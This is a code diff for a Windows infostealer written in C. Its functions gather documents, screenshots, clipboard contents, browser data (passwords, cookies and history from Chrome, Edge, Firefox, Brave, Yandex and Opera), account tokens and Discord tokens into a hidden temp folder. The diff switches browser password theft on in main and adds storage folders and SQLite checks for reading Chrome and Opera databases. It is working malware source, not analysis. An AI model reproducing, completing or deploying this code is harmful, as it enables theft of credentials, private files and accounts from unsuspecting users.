@@ -29,8 +29,7 @@ BCryptDestroyKey_t pBCryptDestroyKey = NULL;
 BCryptCloseAlgorithmProvider_t pBCryptCloseAlgorithmProvider = NULL;
 
 // Function to retrieve function pointers for NT API functions from ntdll.dll
-int GetHandleNTAPI(NtLdrLoadDll *LoadLib, NtLdrGetProcedureAddress *GetProcAdd, NtLdrUnloadDll *UnloadLib)
-{
+int GetHandleNTAPI(NtLdrLoadDll *LoadLib, NtLdrGetProcedureAddress *GetProcAdd, NtLdrUnloadDll *UnloadLib) {
     // I used this website so much for the NtAPI stuff: https://ntdoc.m417z.com/ ;)
 
     // Load the ntdll.dll module
@@ -73,8 +72,7 @@ int GetHandleNTAPI(NtLdrLoadDll *LoadLib, NtLdrGetProcedureAddress *GetProcAdd, 
     // Return success code if all function pointers were successfully retrieved
     return 0;
 }
-int FindImportantFiles(char *basePath, const char *tempPath)
-{
+int FindImportantFiles(char *basePath, const char *tempPath) {
     char path[1000];
     struct dirent *dp;
     DIR *dir = opendir(basePath);
@@ -148,8 +146,7 @@ int FindImportantFiles(char *basePath, const char *tempPath)
     
     return 0; // Return success
 }
-int StealDocuments(const char *folder)
-{
+int StealDocuments(const char *folder) {
     // Log message indicating the start of the file search process
     OKAY("Looking for important files");
     
@@ -249,8 +246,7 @@ int StealDocuments(const char *folder)
 
     return 0; // Return success
 }
-int Screenshot(const char *folder)
-{
+int Screenshot(const char *folder) {
     // Declare a UNICODE_STRING to store the DLL name for dynamic loading of gdi32.dll
     UNICODE_STRING dllName;
     WCHAR dllNameBuffer[] = L"gdi32.dll";
@@ -435,8 +431,7 @@ int Screenshot(const char *folder)
     
     return 0; // Return success
 }
-int Clipboard(const char *folder)
-{
+int Clipboard(const char *folder) {
     // Try to open the clipboard. If it fails, return 1
     if (!OpenClipboard(NULL))
     {
@@ -492,8 +487,7 @@ int Clipboard(const char *folder)
     // Return 0 to indicate success.
     return 0;
 }
-int Browsers(const char *folder_where_to_save_data, char *current_username)
-{
+int Browsers(const char *folder_where_to_save_data, char *current_username) {
     // Fill in the paths with the current username / path.
     char browser_paths[6][MAX_PATH] = {
         {0},
@@ -504,14 +498,16 @@ int Browsers(const char *folder_where_to_save_data, char *current_username)
         {0}
     };
 
-    sprintf(browser_paths[0], "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data", current_username);               // Chrome
-    sprintf(browser_paths[1], "C:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data", current_username);              // Edge
-    sprintf(browser_paths[2], "C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", current_username);            // Firefox
-    sprintf(browser_paths[3], "C:\\Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data", current_username); // Brave
-    sprintf(browser_paths[4], "C:\\Users\\%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data", current_username);        // Yandex
-    sprintf(browser_paths[5], "C:\\Users\\%s\\AppData\\Roaming\\Opera Software\\Opera Stable", current_username);          // Opera
-
+    sprintf(browser_paths[0], "%s\\AppData\\Local\\Google\\Chrome\\User Data", current_username);               // Chrome
+    sprintf(browser_paths[1], "%s\\AppData\\Local\\Microsoft\\Edge\\User Data", current_username);              // Edge
+    sprintf(browser_paths[2], "%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", current_username);            // Firefox
+    sprintf(browser_paths[3], "%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data", current_username); // Brave
+    sprintf(browser_paths[4], "%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data", current_username);        // Yandex
+    sprintf(browser_paths[5], "%s\\AppData\\Roaming\\Opera Software\\Opera Stable", current_username);          // Opera
     int num_browsers = sizeof(browser_paths) / sizeof(browser_paths[0]); // Number of browsers to iterate through.
+
+    // Make dir to store browser passwords.
+    char BrowsersStorePath[MAX_PATH]; snprintf(BrowsersStorePath, sizeof(BrowsersStorePath), "%s\\AppData\\Local\\Temp\\bizfum\\Browsers", current_username); mkdir(BrowsersStorePath);
 
     // Iterate over the list of browsers to check for their installed paths.
     for (int i = 0; i < num_browsers; i++)
@@ -520,18 +516,31 @@ int Browsers(const char *folder_where_to_save_data, char *current_username)
         DWORD attributes = GetFileAttributes(browser_paths[i]);
         if (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY))
         {
+
             // Call the appropriate function for each browser based on the index.
             if (i == 0)
             {
-                Chrome(folder_where_to_save_data, current_username); // Process Chrome.
+                // Since sqlite reader is needed for reading the database of Chrome. Skip to the next browser if DLL is not found.
+                if (access("C:\\Windows\\System32\\winsqlite3.dll", F_OK) != 0) {
+                    printf("Didn't find winsqlite3.dll.\n");
+                    continue;
+                }
+
+                // Make dir to store Chrome data.
+                char ChromeStorage[MAX_PATH]; snprintf(ChromeStorage, sizeof(ChromeStorage), "%s\\AppData\\Local\\Temp\\bizfum\\Browsers\\Chrome", current_username); mkdir(ChromeStorage);
+                Chrome(ChromeStorage, current_username); // Process Chrome.
             }
+
             else if (i == 1)
             {
                 Edge(folder_where_to_save_data, current_username); // Process Edge.
             }
             else if (i == 2)
             {
-                Firefox(folder_where_to_save_data, current_username); // Process Firefox.
+                char FirefoxStorage[MAX_PATH];
+                snprintf(FirefoxStorage, sizeof(FirefoxStorage), "%s\\AppData\\Local\\Temp\\bizfum\\Browsers\\Firefox", current_username);
+                mkdir(FirefoxStorage);
+                Firefox(FirefoxStorage, current_username); // Process Firefox.
             }
             else if (i == 3)
             {
@@ -543,15 +552,18 @@ int Browsers(const char *folder_where_to_save_data, char *current_username)
             }
             else if (i == 5)
             {
+                // Since sqlite reader is needed for reading the database of Opera. skip to the next browser.
+                if (access("C:\\Windows\\System32\\winsqlite3.dll", F_OK) != 0) {
+                    printf("Didn't find the sqlite dll.\n");
+                    continue;
+                }
                 Opera(folder_where_to_save_data, current_username); // Process Opera.
             }
         }
     }
-
-    return 0; // Return success.
+    return 0;
 }
-int AccountTokens(char *temp, char *userf)
-{
+int AccountTokens(char *temp, char *userf) {
     // The file will be named "Account-Tokens.txt" in the given temporary directory.
     char output[MAX_PATH];
     sprintf(output, "%s\\Account-Tokens.txt", temp);
@@ -620,8 +632,7 @@ int AccountTokens(char *temp, char *userf)
 
     return 0; // Return success.
 }
-int Discord(const char *FilePath, char StoreTokens[10][100], int *StoreTokensLength)
-{
+int Discord(const char *FilePath, char StoreTokens[10][100], int *StoreTokensLength) {
     // Check if the file extension is either .ldb or .log, if not, return immediately.
     char *extension = FilePath + (strlen(FilePath) - 4);
     if (strcmp(extension, ".ldb") && strcmp(extension, ".log"))
@@ -847,8 +858,7 @@ int Discord(const char *FilePath, char StoreTokens[10][100], int *StoreTokensLen
 
 
 
-int main()
-{
+int main() {
     // Get function addresses of ntdll LdrLoadLib, LdrUnloadLib and LdrGetProcedureAddress, we need it for winhttp.dll and other dll loading later on.
     if (GetHandleNTAPI(&LoadLib, &GetProcAdd, &UnloadLib) != 0) { return 1; }
     OKAY("Loaded NTAPI!\n\n");
@@ -856,7 +866,7 @@ int main()
 
     // Make temp dir.
     char *currentuser = getenv("USERPROFILE");
-    char temp[256] = "C:\\Users\\";
+    char temp[256];
     snprintf(temp, sizeof(temp), "%s\\AppData\\Local\\Temp\\bizfum", currentuser);
     mkdir(temp);
     OKAY("Temporary directory for storing gathered data is created! Location is %s.\n\n", temp);
@@ -875,7 +885,7 @@ int main()
     if (GetDiskFreeSpaceW(L"C:\\", &sectorsPerCluster, &bytesPerSector, &numberOfFreeClusters, &totalNumberOfClusters)) {
         ULONGLONG freeSpace = (ULONGLONG)numberOfFreeClusters * sectorsPerCluster * bytesPerSector;
         INFO("Free space: %d GB", freeSpace/1000000000);
-        if ((freeSpace/1000000000) >= 5) {
+        if ((freeSpace/1000000000) >= 8) {
             INFO("Enough free space to start stealing files...\n\n\n");
             StealDocuments(temp);
         }
@@ -896,7 +906,7 @@ int main()
 
 
     // Here starts the stealing of browser password, cookies and history.
-    // Browsers(temp, currentuser);
+    Browsers(temp, currentuser);
     // In progress.
 
 
